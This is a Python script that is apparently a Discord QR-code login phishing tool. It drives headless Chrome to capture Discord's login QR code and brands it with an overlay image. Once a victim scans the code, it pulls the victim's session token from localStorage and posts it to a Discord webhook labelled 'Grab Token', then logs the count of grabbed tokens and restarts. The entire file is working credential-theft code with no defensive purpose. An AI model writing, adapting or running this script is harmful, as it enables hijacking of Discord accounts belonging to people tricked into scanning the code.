import re
from bs4 import BeautifulSoup
from selenium import webdriver
from webdriver_manager.chrome import ChromeDriverManager
from PIL import Image
import base64
import time
import os
import requests
import asyncio
import json
from discord_webhook import DiscordWebhook, DiscordEmbed

url = "URL_WEBHOOK_GRABTOKEN"

class Spy:
    gris = "\033[1;30;1m"
    rouge = "\033[1;31;1m"
    vert = "\033[1;32;1m"
    jaune = "\033[1;33;1m"
    bleu = "\033[1;34;1m"
    violet = "\033[1;35;1m"
    cyan = "\033[1;36;1m"
    blanc = "\033[1;0;1m"

def logo_qr():
    im1 = Image.open('temp/qr_code.png', 'r')
    im2 = Image.open('temp/overlay.png', 'r')
    im2_w, im2_h = im2.size
    im1.paste(im2, (60, 55))
    im1.save('temp/final_qr.png', quality=95)

def run():
    try:

        options = webdriver.ChromeOptions()
        options.add_argument("--headless")
        options.add_experimental_option('excludeSwitches', ['enable-logging'])
        options.add_experimental_option('detach', True)
        driver = webdriver.Chrome(ChromeDriverManager().install())
        
        driver.get('https://discord.com/login')
        time.sleep(5)

        page_source = driver.page_source

        soup = BeautifulSoup(page_source, features='lxml')

        div = soup.find('div', {'class': 'qrCode-2R7t9S'})
        qr_code = div.find('img')['src']
        file = os.path.join(os.getcwd(), 'temp/qr_code.png')

        img_data =  base64.b64decode(qr_code.replace('data:image/png;base64,', ''))

        with open(file,'wb') as handler:
            handler.write(img_data)

        discord_login = driver.current_url
        logo_qr()

        while True:
            if discord_login != driver.current_url:
                token = driver.execute_script('''
                    window.dispatchEvent(new Event('beforeunload'));
                    let iframe = document.createElement('iframe');
                    iframe.style.display = 'none';
                    document.body.appendChild(iframe);
                    let localStorage = iframe.contentWindow.localStorage;
                    var token = JSON.parse(localStorage.token);
                    return token;
                    
                    ''')
                print(f'{Spy.gris}[{Spy.vert}INFORMATION{Spy.gris}] Token grabbed:{Spy.blanc}',token)

                data = {
                    "content" : f"```Token: {token} ```",
                    "username" : "Grab Token"
                }
                result = requests.post(url, json = data)
                try:
                    result.raise_for_status()
                except requests.exceptions.HTTPError as err:
                    print(f'{Spy.gris}[{Spy.rouge}ERREUR{Spy.gris}] ',err)
                else:
                    print(f'{Spy.gris}[{Spy.vert}INFORMATION{Spy.gris}] Token Grabbed! Sent to Webook | code {result.status_code}.{Spy.gris}')

                with open('verif.json') as mon_fichier:
                    data = json.load(mon_fichier)
                nbr_verif = data['nbr_verif']
                remake = data['remake']
                nbr_verif +=1
                data = {'nbr_verif':nbr_verif,'remake':remake}
                with open('verif.json', 'w') as j:
                    json.dump(data, j)
                run()
                break
        print(f'{Spy.gris}[{Spy.vert}INFORMATION{Spy.gris}] Task complete.')
        pass
    except:
        pass

run()